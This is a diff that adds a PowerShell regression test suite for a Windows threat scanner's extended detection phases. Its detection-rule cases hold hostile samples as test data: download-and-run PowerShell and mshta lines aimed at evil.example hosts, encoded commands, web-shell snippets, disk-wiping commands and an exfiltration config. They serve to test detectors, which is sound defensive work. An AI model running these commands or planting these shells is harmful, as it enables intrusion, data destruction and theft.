@@ -1,0 +1,419 @@
+﻿<#
+.SYNOPSIS
+    Regression tests for the Extended detection band (phases 116-133, engine/Phases-4.ps1).
+.DESCRIPTION
+    Guards the WS6 expansion added 2026-08-19:
+      * the module exists, carries a BOM, opens with its own top-level trap and is gated
+        on $PhasePlan.Extended (engine-split rules);
+      * phases 116-133 are all present exactly once and the plan ceiling agrees with BOTH
+        servers (phase_total honesty);
+      * the band's FixAction posture: everything is "Info" except three named exceptions,
+        and each of those three is ACCEPTED by the real engine guard — a CRITICAL/HIGH
+        destructive fix that the guard always refuses is the audit-M1 anti-pattern;
+      * every signature key the loader asks for exists, and no key is orphaned;
+      * every regex in data/detection_signatures.json compiles AND survives backtracking
+        bait inside a 150 ms timeout. Several of these rules are matched against
+        ATTACKER-AUTHORED content (web shells, dropped scripts), so a catastrophic
+        pattern is a denial-of-service on the scan itself.
+    Everything is pulled out of the shipped source via the AST — a test here cannot drift
+    from the code it guards. Touches nothing outside the repo.
+#>
+$ErrorActionPreference = 'Continue'
+$root = Split-Path -Parent (Split-Path -Parent $PSScriptRoot)
+Push-Location $root
+$pass = 0; $fail = 0
+function Assert-That { param([string]$Name, $Actual, $Expected)
+    if ("$Actual" -eq "$Expected") { $script:pass++ }
+    else { $script:fail++; Write-Host ("  FAIL  {0}`n        expected [{1}] got [{2}]" -f $Name, $Expected, $Actual) -ForegroundColor Red }
+}
+
+# ── 1. module shape ──────────────────────────────────────────────────────────
+$modPath = Join-Path $root 'engine/Phases-4.ps1'
+Assert-That 'Phases-4.ps1 exists' (Test-Path $modPath) $true
+if (Test-Path $modPath) {
+    $bytes = [System.IO.File]::ReadAllBytes($modPath)
+    Assert-That 'Phases-4.ps1 has UTF-8 BOM' ($bytes[0] -eq 0xEF -and $bytes[1] -eq 0xBB -and $bytes[2] -eq 0xBF) $true
+    $raw = Get-Content $modPath -Raw
+    # The module's FIRST STATEMENT must be a trap: the loader's script-scope trap resumes
+    # at the next dot-source statement, i.e. it would skip the whole rest of this module.
+    # Only the BOM, blank lines and comment lines may precede it \u2014 the deliberate-vocabulary
+    # notice is a comment header and changes nothing about what runs. An executable
+    # statement before the trap is the real defect: that statement runs unprotected.
+    Assert-That 'nothing executable precedes the module trap' `
+        ($raw -match '^\uFEFF?(?:[ \t]*(?:#[^\r\n]*)?\r?\n)*[ \t]*trap\s*\{\s*Write-RecoveredError') $true
+    Assert-That 'band is gated on $PhasePlan.Extended' ($raw -match 'if\s*\(\s*\$PhasePlan\.Extended\s*\)') $true
+    Assert-That 'gated block carries an inner trap' ($raw -match 'if\s*\(\s*\$PhasePlan\.Extended\s*\)\s*\{\s*\r?\n\s*trap\s*\{\s*Write-RecoveredError') $true
+    # $PSScriptRoot inside a module resolves to engine\, not the project root.
+    Assert-That 'no bare $PSScriptRoot in the module' ($raw -match '\$PSScriptRoot') $false
+    # Get-ScanFiles / Get-ProcSnapshot return `,$arr`; @(cmd) yields a ONE-element array
+    # holding the array, so the caller silently filters the wrong thing.
+    Assert-That 'no @(Get-ScanFiles ...) unwrap bug'   ($raw -match '@\(Get-ScanFiles') $false
+    Assert-That 'no @(Get-ProcSnapshot) unwrap bug'    ($raw -match '@\(Get-ProcSnapshot') $false
+    Assert-That 'no raw Get-AuthenticodeSignature'     ($raw -match 'Get-AuthenticodeSignature') $false
+    Assert-That 'no raw Get-ItemPropertyValue'         ($raw -match 'Get-ItemPropertyValue') $false
+    Assert-That 'no raw Get-FileHash'                  ($raw -match '(?<!Safe\s)\bGet-FileHash\b(?!Safe)') $false
+    Assert-That 'no raw Get-ChildItem -Recurse over a user root' ($raw -match 'Get-ChildItem[^\r\n]*\$env:(USERPROFILE|APPDATA|LOCALAPPDATA)[^\r\n]*-Recurse') $false
+
+    # ── 2. phases 116-133 present exactly once ───────────────────────────────
+    $hdrs = @([regex]::Matches($raw, 'Show-PhaseHeader "PHASE (\d+(?:\.\d+)?)"') | ForEach-Object { $_.Groups[1].Value })
+    Assert-That 'phase headers count' $hdrs.Count 18
+    Assert-That 'phase headers unique' (@($hdrs | Sort-Object -Unique).Count) 18
+    $expected = 116..133 | ForEach-Object { "$_" }
+    Assert-That 'phase headers are exactly 116-133' ((@($hdrs | Sort-Object) -join ',') -eq (($expected | Sort-Object) -join ',')) $true
+}
+
+# ── 3. plan ceiling agrees across engine + both servers ──────────────────────
+$loaderRaw = Get-Content (Join-Path $root 'ZeroBreach-V23.ps1') -Raw
+Assert-That 'loader dot-sources Phases-4 after Phases-3' `
+    ($loaderRaw -match 'Phases-3\.ps1"\s*\r?\n\.\s*"\$PSScriptRoot\\engine\\Phases-4\.ps1"') $true
+Assert-That 'DEEP plan ceiling is 133'     ($loaderRaw -match '"DEEP"\s*\{\s*@\{\s*Min=1;\s*Max=133') $true
+Assert-That 'PARANOID plan ceiling is 133' ($loaderRaw -match '"PARANOID"\s*\{\s*@\{\s*Min=1;\s*Max=133') $true
+Assert-That 'STEALTH plan ceiling is 133'  ($loaderRaw -match '"STEALTH"\s*\{\s*@\{\s*Min=1;\s*Max=133') $true
+$srvRaw = Get-Content (Join-Path $root 'ZeroBreach-Server.ps1') -Raw
+Assert-That 'PS server MODE_PHASES matches the plan' `
+    ($srvRaw -match '\$MODE_PHASES\s*=\s*@\{\s*QUICK=30;\s*FULL=80;\s*DEEP=133;\s*PARANOID=133;\s*STEALTH=133;\s*HUNT=162\s*\}') $true
+$pyPath = Join-Path $root '_python/server.py'
+if (Test-Path $pyPath) {
+    $pyRaw = Get-Content $pyPath -Raw
+    Assert-That 'python mirror MODE_PHASES matches the plan' `
+        ($pyRaw -match '"DEEP":\s*133,\s*"PARANOID":\s*133,\s*"STEALTH":\s*133,\s*"HUNT":\s*162') $true
+}
+
+# ── 4. FixAction posture + the three destructive exceptions ──────────────────
+$t=$null; $e=$null
+$modAst = [System.Management.Automation.Language.Parser]::ParseFile($modPath, [ref]$t, [ref]$e)
+Assert-That 'Phases-4 parses clean' $e.Count 0
+$calls = @($modAst.FindAll({param($n) $n -is [System.Management.Automation.Language.CommandAst] -and
+                            $n.GetCommandName() -eq 'Add-Finding'}, $true))
+$fixActions = @()
+foreach ($c in $calls) {
+    $els = $c.CommandElements
+    for ($i = 0; $i -lt $els.Count; $i++) {
+        if ($els[$i] -is [System.Management.Automation.Language.CommandParameterAst] -and
+            $els[$i].ParameterName -eq 'FixAction' -and $i + 1 -lt $els.Count) {
+            $fixActions += ($els[$i+1].Extent.Text -replace '"', '')
+        }
+    }
+}
+Assert-That 'every Add-Finding declares a FixAction' $fixActions.Count $calls.Count
+$destructiveLiterals = @($fixActions | Where-Object { $_ -match '^(DeleteFile|DeleteReg|DeleteRegKey|KillProcess|RunCmd|Quarantine)$' })
+# The band is detect-and-advise: exactly ONE literal destructive fix (the Office test key).
+Assert-That 'exactly one literal destructive FixAction in the band' $destructiveLiterals.Count 1
+Assert-That 'that one is DeleteRegKey' ($destructiveLiterals[0]) 'DeleteRegKey'
+$conditional = @($fixActions | Where-Object { $_ -match '^\$' })
+Assert-That 'two conditional FixActions (the .lnk and webhook quarantines)' $conditional.Count 2
+Assert-That 'the rest are Info' (@($fixActions | Where-Object { $_ -eq 'Info' }).Count) ($fixActions.Count - 3)
+
+# Load the REAL engine guard and prove each destructive fix is ACCEPTED (audit M1: a
+# finding that is auto-selected and then always reported `blocked` teaches operators to
+# distrust the guard), while a control case is still refused.
+$loaderAst = [System.Management.Automation.Language.Parser]::ParseFile((Join-Path $root 'ZeroBreach-V23.ps1'), [ref]$t, [ref]$e)
+foreach ($fn in @('ConvertTo-EGuardPath','Test-EDestructiveRunCmd','Test-EProtected')) {
+    $d = @($loaderAst.FindAll({param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $n.Name -eq $fn}, $true))[0]
+    if ($d) { . ([scriptblock]::Create($d.Extent.Text)) } else { $fail++; Write-Host "  FAIL  guard function $fn not found" -ForegroundColor Red }
+}
+# The guard reads its tables from global scope. An UNLOADED table is $null, and
+# `-match ''` is true — the test would then agree for the wrong reason (caught 2026-08-19).
+foreach ($v in @('RUNCMD_DESTRUCTIVE_E','RUNCMD_MUTATING_E','KILL_CRITICAL_NAME_RX_E','KILL_CRITICAL_DESC_RX_E')) {
+    $a = @($loaderAst.FindAll({param($n) $n -is [System.Management.Automation.Language.AssignmentStatementAst] -and
+                               $n.Left.Extent.Text -eq ('$global:' + $v)}, $true))[0]
+    if ($a) { . ([scriptblock]::Create($a.Extent.Text)) } else { $fail++; Write-Host "  FAIL  guard table $v not loaded" -ForegroundColor Red }
+    Assert-That "guard table $v is populated" ([bool](Get-Variable -Name $v -Scope Global -ValueOnly -ErrorAction SilentlyContinue)) $true
+}
+$guardCases = @(
+    @{ N='P118 .lnk on the user Desktop';   A='Quarantine';   P='C:\Users\jdoe\Desktop\invoice.lnk';                       Blocked=$false },
+    @{ N='P118 .lnk in the Start Menu';     A='Quarantine';   P='C:\ProgramData\Microsoft\Windows\Start Menu\Programs\a.lnk'; Blocked=$false },
+    @{ N='P130 patched Discord module';     A='Quarantine';   P='C:\Users\jdoe\AppData\Roaming\discord\0.0.309\modules\core\index.js'; Blocked=$false },
+    @{ N='P121 Office test key (HKLM)';     A='DeleteRegKey'; P='HKLM:\SOFTWARE\Microsoft\Office test\Special\Perf';        Blocked=$false },
+    @{ N='P121 Office test key (WOW64)';    A='DeleteRegKey'; P='HKLM:\SOFTWARE\WOW6432Node\Microsoft\Office test\Special\Perf'; Blocked=$false },
+    @{ N='CONTROL System32 file';           A='Quarantine';   P='C:\Windows\System32\kernel32.dll';                        Blocked=$true  },
+    @{ N='CONTROL AppCertDlls value';       A='DeleteReg';    P='HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls|evil'; Blocked=$true }
+)
+foreach ($g in $guardCases) {
+    $verdict = Test-EProtected -Action $g.A -Param $g.P -Target $g.P -Desc 'Extended-band finding'
+    Assert-That ("guard: {0}" -f $g.N) ([bool]$verdict) $g.Blocked
+}
+
+# ── 5. signature keys: all requested exist, none orphaned ────────────────────
+$sig = Get-Content (Join-Path $root 'data/detection_signatures.json') -Raw | ConvertFrom-Json
+$sigKeys = @($sig.psobject.properties.Name)
+$asked = @([regex]::Matches($loaderRaw, "(?:Get-Sig|Join-AllowRegex)\s+'([a-z0-9_]+)'") |
+           ForEach-Object { $_.Groups[1].Value } | Sort-Object -Unique)
+Assert-That 'no missing signature keys'  (@($asked   | Where-Object { $sigKeys -notcontains $_ }).Count) 0
+Assert-That 'no orphaned signature keys' (@($sigKeys | Where-Object { $_ -notlike '_comment*' -and $asked -notcontains $_ }).Count) 0
+
+# ── 6. every signature regex compiles and is backtracking-safe ───────────────
+# Bait strings chosen to blow up a catastrophic pattern (long runs the engine can
+# almost-match, then has to unwind). 150 ms is the same budget the IOC validator uses.
+# Each bait ALMOST matches and then fails on a trailing mismatch — that is what forces a
+# catastrophic pattern to explore every partition of the run. A bait that matches cleanly
+# proves nothing (verified: '(a+)+$' vs a pure run of 'a' returns instantly).
+$STOP = '!'
+$bait = @(
+    (('a' * 3000) + $STOP),
+    (('Chr(65)&' * 400) + $STOP),
+    ('<%@ Page Language="C#" %>' + ('x' * 2000) + $STOP),
+    ('[remote]' + ("`n" * 40) + 'type = ' + ('s' * 400) + $STOP),
+    ('https://discord.com/api/webhooks/' + ('1' * 400) + $STOP),
+    ('powershell -w hidden ' + ('-nop ' * 400) + $STOP),
+    ('user_pref("network.proxy.type",' + ('0' * 2000) + $STOP),
+    ('bc1' + ('q' * 2000) + $STOP),
+    ("`"update_url`":`"" + ('h' * 2000) + $STOP),
+    ((' ' * 2000) + $STOP),
+    (('\' + ('x' * 200)) * 20 + $STOP),
+    (('0' * 2000) + $STOP)
+)
+# Self-check: the bait must actually catch a known-catastrophic pattern, or this whole
+# section is a no-op that silently approves every future rule.
+$canary = [regex]::new('(a+)+$', [System.Text.RegularExpressions.RegexOptions]::None, [timespan]::FromMilliseconds(150))
+$canaryTripped = $false
+foreach ($b in $bait) {
+    try { [void]$canary.IsMatch($b) } catch [System.Text.RegularExpressions.RegexMatchTimeoutException] { $canaryTripped = $true; break } catch {}
+}
+Assert-That 'ReDoS bait actually trips a known-catastrophic pattern' $canaryTripped $true
+$badRx = 0; $slowRx = @()
+foreach ($k in $sigKeys) {
+    foreach ($item in @($sig.$k)) {
+        $patterns = @()
+        if ($item -is [string]) { if ($k -match 'regex') { $patterns += $item } }
+        else { foreach ($p in @('Pattern','Rx','NameRx','ContentRx','unattended_rule')) { if ($item.$p) { $patterns += "$($item.$p)" } } }
+        foreach ($pat in $patterns) {
+            $re = $null
+            try { $re = [regex]::new($pat, [System.Text.RegularExpressions.RegexOptions]::None, [timespan]::FromMilliseconds(150)) }
+            catch { $badRx++; Write-Host ("  FAIL  regex does not compile in {0}: {1}" -f $k, $pat.Substring(0,[Math]::Min(70,$pat.Length))) -ForegroundColor Red; continue }
+            foreach ($b in $bait) {
+                try { [void]$re.IsMatch($b) }
+                catch [System.Text.RegularExpressions.RegexMatchTimeoutException] {
+                    $slowRx += ("{0}: {1}" -f $k, $pat.Substring(0,[Math]::Min(70,$pat.Length))); break
+                } catch {}
+            }
+        }
+    }
+}
+Assert-That 'every signature regex compiles' $badRx 0
+if ($slowRx.Count) { $slowRx | ForEach-Object { Write-Host ("  FAIL  catastrophic backtracking: {0}" -f $_) -ForegroundColor Red } }
+Assert-That 'no signature regex backtracks past 150 ms on bait' $slowRx.Count 0
+
+# ── 6b. detection rules fire on malicious input and stay quiet on benign input ──
+# These run the SHIPPED regexes against realistic WINDOWS paths and payloads. That
+# matters because the engine is Windows-only: an allowlist written with '\' separators
+# cannot be exercised by a Linux filesystem fixture, so path-shaped rules would otherwise
+# go completely untested until a live run.
+function Get-RuleSet { param([string]$Key) @($sig.$Key) }
+function Test-AnyRule { param($Rules, [string]$Text)
+    foreach ($r in @($Rules)) { if ($r.Pattern -and $Text -match $r.Pattern) { return $true } }
+    return $false }
+function Join-Allow { param([string]$Key) $a = @($sig.$Key); if ($a.Count) { ($a -join '|') } else { '(?!)' } }
+
+# rule set -> @(strings that MUST match), @(strings that MUST NOT match)
+$ruleCases = @(
+  @{ Key='lnk_hijack_rules'
+     Hit=@('C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString(''http://x/a'')',
+           'C:\Windows\System32\cmd.exe /c start invoice.vbs',
+           'C:\Windows\System32\mshta.exe https://evil.example/a.hta',
+           'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA')
+     Miss=@('C:\Program Files\Google\Chrome\Application\chrome.exe',
+            'C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE /n',
+            'C:\Windows\System32\notepad.exe C:\Users\jdoe\Documents\notes.txt') }
+  @{ Key='clickfix_runmru_rules'
+     Hit=@('mshta https://verify-human.example/c.hta',
+           'powershell -w h -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
+           'curl https://evil.example/a.exe -o a.exe',
+           'msiexec /i "https://evil.example/p.msi"')
+     Miss=@('notepad.exe','cmd','\\fileserver01\share','control.exe','powershell') }
+  @{ Key='webshell_content_rules'
+     Hit=@('<% eval(Request["cmd"]); %>',
+           '<?php system($_GET["c"]); ?>',
+           '<% System.Diagnostics.Process.Start("cmd.exe", Request["c"]); %>',
+           '<% Assembly.Load(Convert.FromBase64String(x)); %>')
+     Miss=@('<%@ Page Language="C#" %><h1>Hello</h1>',
+            '<?php echo htmlspecialchars($_GET["name"]); ?>',
+            'Response.Write("welcome");') }
+  @{ Key='webhook_c2_rules'
+     Hit=@('https://discord.com/api/webhooks/123456789012345678/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb',
+           'https://api.telegram.org/bot1234567890:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw/sendMessage',
+           'https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX',
+           'https://pastebin.com/raw/AbCd1234')
+     Miss=@('https://discord.com/channels/@me','https://api.telegram.org/','https://pastebin.com/AbCd1234',
+            'https://github.com/user/repo') }
+  @{ Key='destructive_behavior_rules'
+     Hit=@('wiper.exe \\.\PhysicalDrive0','format C: /y','diskpart /s clean all')
+     Miss=@('C:\Windows\System32\chkdsk.exe C: /f','robocopy C:\a C:\b /MIR') }
+  @{ Key='browser_arg_abuse_rules'
+     Hit=@('"C:\Program Files\Google\Chrome\Application\chrome.exe" --remote-debugging-port=9222',
+           'msedge.exe --load-extension=C:\Users\Public\ext',
+           'chrome.exe --disable-web-security')
+     Miss=@('"C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory="Default"',
+            'msedge.exe --no-startup-window --win-session-start') }
+  @{ Key='exfil_config_rules'
+     Hit=@("[loot]`ntype = mega`nuser = a@b.c")
+     Miss=@("# rclone config`n# nothing configured yet") }
+)
+foreach ($rc in $ruleCases) {
+    $rules = Get-RuleSet $rc.Key
+    Assert-That ("rule set {0} is loaded" -f $rc.Key) ([bool](@($rules).Count -gt 0)) $true
+    foreach ($h in $rc.Hit)  { Assert-That ("{0} MUST match: {1}"     -f $rc.Key, $h.Substring(0,[Math]::Min(46,$h.Length))) (Test-AnyRule $rules $h) $true  }
+    foreach ($m in $rc.Miss) { Assert-That ("{0} must NOT match: {1}" -f $rc.Key, $m.Substring(0,[Math]::Min(46,$m.Length))) (Test-AnyRule $rules $m) $false }
+}
+
+# Allowlists: benign real-world Windows paths must be suppressed, malicious ones must not.
+$allowCases = @(
+  @{ Key='sideload_benign_paths'
+     Allow=@('C:\Users\jdoe\AppData\Local\Microsoft\OneDrive\24.161.0808.0001\version.dll',
+             'C:\Users\jdoe\AppData\Local\Programs\Microsoft VS Code\dbghelp.dll',
+             'C:\ProgramData\Package Cache\{guid}\winmm.dll')
+     Deny=@('C:\Users\jdoe\AppData\Local\EvilApp\version.dll',
+            'C:\Users\Public\Downloads\dbghelp.dll',
+            'C:\Users\jdoe\AppData\Local\Temp\winmm.dll') }
+  @{ Key='webhook_c2_benign_paths'
+     Allow=@('C:\dev\proj\node_modules\discord.js\src\hook.js',
+             'C:\Python312\Lib\site-packages\requests\api.py',
+             'C:\Users\jdoe\AppData\Local\Programs\Microsoft VS Code\out\x.js')
+     # the chat clients are deliberately NOT allowlisted — Phase 130's client-core
+     # Quarantine branch exists precisely for a stealer patched into them
+     Deny=@('C:\Users\jdoe\AppData\Roaming\discord\0.0.309\modules\core\index.js',
+            'C:\Users\jdoe\AppData\Local\Temp\stage.ps1') }
+  @{ Key='exec_evidence_benign_paths'
+     Allow=@('C:\Users\jdoe\AppData\Local\Temp\_MEI123456\python.exe',
+             'C:\ProgramData\CentraStage\AEMAgent\agent.exe',
+             'C:\Users\jdoe\Downloads\chrome-setup.exe')
+     Deny=@('C:\Users\jdoe\AppData\Local\Temp\dropper.exe',
+            'C:\Users\Public\svchost.exe') }
+  @{ Key='native_messaging_benign_hosts'
+     Allow=@('com.1password.browserhelper','com.bitwarden.nativemessaging','com.google.chrome.example')
+     Deny=@('com.evil.helper','net.attacker.bridge') }
+  @{ Key='shell_extension_benign_dlls'
+     Allow=@('C:\Windows\System32\shell32.dll',
+             'C:\Program Files\7-Zip\7-zip.dll',
+             'C:\Users\jdoe\AppData\Local\Microsoft\OneDrive\FileSyncShell64.dll')
+     Deny=@('C:\Users\jdoe\AppData\Local\Temp\shell.dll','C:\Users\Public\ctx.dll') }
+  @{ Key='packed_script_benign_paths'
+     Allow=@('C:\Program Files (x86)\AutoIt3\AutoIt3.exe',
+             'C:\Users\jdoe\AppData\Local\Temp\_MEI98765\base_library.zip')
+     Deny=@('C:\Users\jdoe\AppData\Local\Temp\dg\AutoIt3.exe',
+            'C:\Users\Public\script.a3x') }
+  @{ Key='office_addin_benign_paths'
+     Allow=@('C:\Program Files\Microsoft Office\root\Office16\ADDINS\x.xlam',
+             'C:\Program Files (x86)\Datto\addin.dll')
+     Deny=@('C:\Users\jdoe\AppData\Roaming\Microsoft\AddIns\invoice.xll') }
+)
+foreach ($ac in $allowCases) {
+    $rx = Join-Allow $ac.Key
+    Assert-That ("allowlist {0} is non-empty" -f $ac.Key) ($rx -ne '(?!)') $true
+    foreach ($a in $ac.Allow) { Assert-That ("{0} suppresses: {1}"          -f $ac.Key, $a) ($a -match $rx) $true  }
+    foreach ($dd in $ac.Deny) { Assert-That ("{0} must NOT suppress: {1}"   -f $ac.Key, $dd) ($dd -match $rx) $false }
+}
+
+# The suspect-path regex that drives Phase 123 must key on user-writable locations only.
+Assert-That 'exec-evidence suspect regex matches a Temp dropper' `
+    ('C:\Users\jdoe\AppData\Local\Temp\dropper.exe' -match $sig.exec_evidence_suspect_path_regex) $true
+Assert-That 'exec-evidence suspect regex ignores Program Files' `
+    ('C:\Program Files\Notepad++\notepad++.exe' -match $sig.exec_evidence_suspect_path_regex) $false
+Assert-That 'exec-evidence suspect regex ignores System32' `
+    ('C:\Windows\System32\svchost.exe' -match $sig.exec_evidence_suspect_path_regex) $false
+
+# Phase-6 auto-kill discipline: those five lists become CRITICAL + KillProcess on a bare
+# substring match of a process name, so no entry may collide with real software.
+$p6 = @('known_rat_procs','known_miner_procs','known_keylogger_procs','loader_procs','banking_trojan_procs')
+$realProcs = @('houdini','houdinifx','explorer','svchost','chrome','msedge','teams','outlook','onedrive',
+               'keybase','ispy','origin','steam','discord','slack','zoom','nvcontainer','sogou','syncro',
+               'aemagent','centrastage','kaseya','node','python','code','pwsh','powershell','searchindexer',
+               'mysqld','postgres','dockerd','vmware','virtualbox','citrix','teamviewer','anydesk')
+$collisions = @()
+foreach ($k in $p6) {
+    foreach ($entry in @($sig.$k)) {
+        $e = "$entry".ToLower()
+        if ($e.Length -lt 4) { $collisions += "$k -> '$e' (shorter than 4 chars)" ; continue }
+        foreach ($rp in $realProcs) { if ($rp -match [regex]::Escape($e)) { $collisions += "$k -> '$e' collides with process '$rp'" } }
+    }
+}
+if ($collisions.Count) { $collisions | Select-Object -Unique | ForEach-Object { Write-Host ("  FAIL  {0}" -f $_) -ForegroundColor Red } }
+Assert-That 'no Phase-6 auto-kill IOC collides with real software' $collisions.Count 0
+
+# ── 7. MITRE map covers the new band ─────────────────────────────────────────
+$mitre = Get-Content (Join-Path $root 'data/mitre_mapping.json') -Raw | ConvertFrom-Json
+$missingPhase = @(116..133 | Where-Object { -not $mitre.phase_map."PHASE $_" })
+Assert-That 'MITRE phase_map covers 116-133' $missingPhase.Count 0
+$dangling = 0
+foreach ($p in $mitre.phase_map.psobject.properties) {
+    if ($p.Name -like '_comment*') { continue }   # phase_map carries a documentation string too
+    foreach ($tid in @($p.Value.techniques)) { if ($tid -and -not $mitre.techniques.$tid) { $dangling++ } }
+}
+Assert-That 'no dangling MITRE technique references' $dangling 0
+
+# ── 7b. the release manifest must stage every engine module ──────────────────
+# Build-Release.ps1 keeps a FIXED $requiredFiles list. A module the loader dot-sources but
+# the builder does not stage produces a release that dies on startup — the failure is
+# invisible until someone extracts the zip on a client machine.
+$brPath = Join-Path $root 'tools/Build-Release.ps1'
+if (Test-Path $brPath) {
+    $brRaw = Get-Content $brPath -Raw
+    $dotSourced = @([regex]::Matches($loaderRaw, '\.\s+"\$PSScriptRoot\\engine\\([A-Za-z0-9\-]+\.ps1)"') |
+                    ForEach-Object { $_.Groups[1].Value })
+    # 10 since WS7: Phases-0 (preflight) + 1-7 + Summary + FixMode. The count is pinned
+    # so that ADDING a module without staging it in the release manifest fails here — a
+    # missing module ships a release that dies at startup, and that is invisible until
+    # someone extracts the zip on a client machine.
+    Assert-That 'loader dot-sources the expected module count' $dotSourced.Count 10
+    foreach ($m in $dotSourced) {
+        Assert-That ("release manifest stages engine\{0}" -f $m) ($brRaw -match ([regex]::Escape("engine\$m"))) $true
+    }
+}
+
+# ── 8. WS4: the per-file Authenticode memo ───────────────────────────────────
+# Get-AuthenticodeSignature does ONLINE revocation checks, so a repeat lookup is the
+# engine's most expensive redundant operation. Pull the real Get-AuthSig out of the
+# loader, put a counting stub behind it, and prove it is called once per distinct path.
+$authAst = @($loaderAst.FindAll({param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] -and
+                                 $n.Name -eq 'Get-AuthSig'}, $true))[0]
+Assert-That 'Get-AuthSig is defined in the loader' ([bool]$authAst) $true
+if ($authAst) {
+    $global:REAL_CALLS = 0
+    function Get-AuthenticodeSignature { param([string]$LiteralPath, $ErrorAction)
+        $global:REAL_CALLS++
+        if ($LiteralPath -like '*locked*') { throw 'file is in use' }
+        return [pscustomobject]@{ Status = 'Valid'; SignerCertificate = $null; Path = $LiteralPath } }
+    . ([scriptblock]::Create($authAst.Extent.Text))
+
+    $global:SCAN_FILE_CACHE_ON = $true
+    $global:AUTHSIG_CACHE = @{}; $global:AUTHSIG_CACHE_HITS = 0; $global:AUTHSIG_CACHE_MAX = 20000
+    $global:REAL_CALLS = 0
+    1..5 | ForEach-Object { [void](Get-AuthSig 'C:\Users\jdoe\AppData\Local\Temp\a.exe') }
+    [void](Get-AuthSig 'C:\Users\jdoe\AppData\Local\Temp\b.exe')
+    Assert-That 'memo: 6 lookups over 2 paths hit the API twice' $global:REAL_CALLS 2
+    Assert-That 'memo: 4 cache hits recorded'                    $global:AUTHSIG_CACHE_HITS 4
+    # Windows paths are case-insensitive; the memo key must be too, or every phase that
+    # spells a path differently pays the full online cost again.
+    $global:REAL_CALLS = 0
+    [void](Get-AuthSig 'c:\users\jdoe\appdata\local\temp\A.EXE')
+    Assert-That 'memo key is case-insensitive' $global:REAL_CALLS 0
+    # A locked/unreadable file is a real, repeatable answer — cache it, do not re-pay.
+    $global:REAL_CALLS = 0
+    [void](Get-AuthSig 'C:\Windows\System32\locked.exe')
+    [void](Get-AuthSig 'C:\Windows\System32\locked.exe')
+    Assert-That 'memo: a throwing (locked) file is cached too' $global:REAL_CALLS 1
+    Assert-That 'memo: a throwing file returns $null not an exception' ($null -eq (Get-AuthSig 'C:\Windows\System32\locked.exe')) $true
+    # ZB_NOCACHE must produce a genuinely cache-free run.
+    $global:SCAN_FILE_CACHE_ON = $false
+    $global:AUTHSIG_CACHE = @{}; $global:REAL_CALLS = 0
+    1..3 | ForEach-Object { [void](Get-AuthSig 'C:\Users\jdoe\AppData\Local\Temp\c.exe') }
+    Assert-That 'ZB_NOCACHE bypasses the memo'          $global:REAL_CALLS 3
+    Assert-That 'ZB_NOCACHE stores nothing'             $global:AUTHSIG_CACHE.Count 0
+    # Bounded: a signature object carries a cert chain, so the memo must not grow forever.
+    $global:SCAN_FILE_CACHE_ON = $true
+    $global:AUTHSIG_CACHE = @{}; $global:AUTHSIG_CACHE_MAX = 3; $global:REAL_CALLS = 0
+    1..10 | ForEach-Object { [void](Get-AuthSig "C:\t\f$_.exe") }
+    Assert-That 'memo respects AUTHSIG_CACHE_MAX' $global:AUTHSIG_CACHE.Count 3
+    Remove-Item function:Get-AuthenticodeSignature -ErrorAction SilentlyContinue
+}
+# Get-SignatureVerdict must go THROUGH the wrapper, or it silently bypasses the memo and
+# re-pays the online revocation check for every file the integrity phases look at.
+Assert-That 'Get-SignatureVerdict routes through Get-AuthSig' `
+    ($loaderRaw -match 'function Get-SignatureVerdict[\s\S]{0,900}?\$sig\s*=\s*Get-AuthSig\s') $true
+Assert-That 'no raw Get-AuthenticodeSignature outside the Get-AuthSig wrapper' `
+    (([regex]::Matches($loaderRaw, 'Get-AuthenticodeSignature\s+-LiteralPath')).Count) 1
+
+Pop-Location
+Write-Host ""
+if ($fail) { Write-Host ("{0} passed, {1} failed" -f $pass, $fail) -ForegroundColor Red; exit 1 }
+Write-Host ("{0} passed, 0 failed" -f $pass) -ForegroundColor Green
